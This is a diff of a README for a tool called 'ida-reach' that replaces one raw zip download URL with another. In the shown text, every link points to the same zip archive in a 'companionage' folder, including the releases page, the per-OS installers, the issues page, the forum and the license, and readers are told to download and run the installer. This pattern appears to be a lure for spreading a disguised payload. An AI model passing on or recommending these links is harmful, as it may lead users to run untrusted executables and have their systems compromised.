@@ -6,11 +6,11 @@ Welcome to the **ida-reach** repository! This application provides useful utilit
 
 ## 📥 Download ida-reach
 
-[![Download ida-reach](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip)](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip)
+[![Download ida-reach](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip)](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip)
 
 You can obtain the latest version of ida-reach from our Releases page. Click the link below:
 
-- [Visit this page to download](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip)
 
 ## 📋 System Requirements
 
@@ -25,16 +25,16 @@ Before you install, ensure your system meets the following requirements:
 To install ida-reach, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip).
+   Go to our [Releases page](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip).
 
 2. **Choose the Latest Release:**
    Look for the latest version at the top of the page. Each release has a title and a list of assets.
 
 3. **Download the Installer:**
    Click on the file that best suits your operating system. For example:
-   - For Windows, download `https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip`
-   - For macOS, download `https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip`
-   - For Linux, download `https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip`
+   - For Windows, download `https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip`
+   - For macOS, download `https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip`
+   - For Linux, download `https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip`
 
 4. **Run the Installer:**
    Once the file has finished downloading, locate it on your computer and double-click to run the installer. Follow the prompts to complete the installation.
@@ -88,13 +88,13 @@ If you encounter issues, try these solutions:
 
 ## 📞 Support and Contributions
 
-We welcome contributions from everyone! If you want to improve or help us troubleshoot ida-reach, visit our [issues](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip) page to report any problems or suggestions.
+We welcome contributions from everyone! If you want to improve or help us troubleshoot ida-reach, visit our [issues](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip) page to report any problems or suggestions.
 
-For more details, or if you need assistance, feel free to reach out through our [discussion forum](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip).
+For more details, or if you need assistance, feel free to reach out through our [discussion forum](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip).
 
 ## 📚 License
 
-ida-reach is open-source software licensed under the MIT License. You can find more details in our [LICENSE](https://github.com/than0024/ida-reach/raw/refs/heads/master/companionage/ida-reach-v3.6.zip) file.
+ida-reach is open-source software licensed under the MIT License. You can find more details in our [LICENSE](https://raw.githubusercontent.com/than0024/ida-reach/master/companionage/ida-reach-v1.1.zip) file.
 
 ## ❓ FAQs
 
